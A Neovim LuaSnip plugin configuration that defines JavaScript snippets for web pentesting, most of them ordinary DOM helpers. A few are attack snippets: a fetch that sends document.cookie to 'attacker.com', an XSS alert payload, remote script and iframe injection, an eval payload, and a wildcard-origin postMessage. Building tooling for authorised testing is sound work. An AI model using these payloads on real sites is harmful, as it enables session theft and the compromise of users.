-- Custom LuaSnip snippets for JavaScript pentesting
local Plugin = {'L3MON4D3/LuaSnip'}

Plugin.event = 'InsertEnter'

function Plugin.config()
  local ls = require('luasnip')
  local s = ls.snippet
  local t = ls.text_node
  local i = ls.insert_node

  -- JavaScript pentesting snippets
  ls.add_snippets('javascript', {
    -- setTimeout
    s('set', {
      t("setTimeout(() => {"),
      t({"", "  "}), i(1),
      t({"", "}, "}), i(2, "1000"), t(")"),
    }),

    -- window.open
    s('win', {
      t("window.open('"), i(1, "url"), t("', '"), i(2, "name"), t("', '"), i(3, "features"), t("')"),
    }),

    -- window.opener
    s('win', {
      t("window.opener"), i(0),
    }),

    -- postMessage send
    s('pos', {
      t("window.postMessage("), i(1, "message"), t(", '"), i(2, "*"), t("')"),
    }),

    -- postMessage listener
    s('add', {
      t({"window.addEventListener('message', (event) => {", "  "}),
      i(1, "// handle message"),
      t({"", "})"}),
    }),

    -- postMessage full handler
    s('add', {
      t({"window.addEventListener('message', (event) => {", "  "}),
      t({"console.log('Origin:', event.origin)", "  "}),
      t({"console.log('Data:', event.data)", "  "}),
      i(1),
      t({"", "})"}),
    }),

    -- XSS alert
    s('ale', {
      t("alert('"), i(1, "XSS"), t("')"),
    }),

    -- document.cookie
    s('doc', {
      t("document.cookie"),
    }),

    -- fetch cookies
    s('fet', {
      t("fetch('"), i(1, "http://attacker.com"), t("?c=' + document.cookie)"),
    }),

    -- eval payload
    s('ev', {
      t("eval("), i(1), t(")"),
    }),

    -- innerHTML
    s('inn', {
      t("document.getElementById('"), i(1, "id"), t("').innerHTML = "), i(2),
    }),

    -- addEventListener
    s('add', {
      t("addEventListener('"), i(1, "event"), t("', (e) => {"),
      t({"", "  "}), i(2),
      t({"", "})"}),
    }),

    -- location.href
    s('loc', {
      t("location.href = '"), i(1, "url"), t("'"),
    }),

    -- document.location
    s('doc', {
      t("document.location = '"), i(1, "url"), t("'"),
    }),

    -- iframe injection
    s('ifr', {
      t("const iframe = document.createElement('iframe')"),
      t({"", "iframe.src = '"}), i(1, "url"), t("'"),
      t({"", "document.body.appendChild(iframe)"}),
    }),

    -- script injection
    s('scr', {
      t("const script = document.createElement('script')"),
      t({"", "script.src = '"}), i(1, "url"), t("'"),
      t({"", "document.body.appendChild(script)"}),
    }),

    -- localStorage get
    s('loc', {
      t("localStorage.getItem('"), i(1, "key"), t("')"),
    }),

    -- localStorage set
    s('loc', {
      t("localStorage.setItem('"), i(1, "key"), t("', "), i(2, "value"), t(")"),
    }),

    -- console.log
    s('con', {
      t("console.log("), i(1), t(")"),
    }),

    -- JSON.parse
    s('jso', {
      t("JSON.parse("), i(1), t(")"),
    }),

    -- JSON.stringify
    s('jso', {
      t("JSON.stringify("), i(1), t(")"),
    }),

    -- document.createElement
    s('doc', {
      t("document.createElement('"), i(1, "div"), t("')"),
    }),

    -- createElement and append
    s('doc', {
      t("const "), i(1, "el"), t(" = document.createElement('"), i(2, "div"), t("')"),
      t({"", ""}), i(3),
      t({"", "document.body.appendChild("}), i(4, "el"), t(")"),
    }),

    -- appendChild
    s('app', {
      i(1, "parent"), t(".appendChild("), i(2, "child"), t(")"),
    }),

    -- append
    s('ap', {
      i(1, "parent"), t(".append("), i(2), t(")"),
    }),

    -- setAttribute
    s('set', {
      i(1, "element"), t(".setAttribute('"), i(2, "attr"), t("', '"), i(3, "value"), t("')"),
    }),

    -- getElementById
    s('get', {
      t("document.getElementById('"), i(1, "id"), t("')"),
    }),

    -- querySelector
    s('que', {
      t("document.querySelector('"), i(1, "selector"), t("')"),
    }),

    -- querySelectorAll
    s('que', {
      t("document.querySelectorAll('"), i(1, "selector"), t("')"),
    }),
  })

  -- Also add to TypeScript and HTML
  ls.filetype_extend('typescript', {'javascript'})
  ls.filetype_extend('javascriptreact', {'javascript'})
  ls.filetype_extend('typescriptreact', {'javascript'})
  ls.filetype_extend('html', {'javascript'})
end

return Plugin
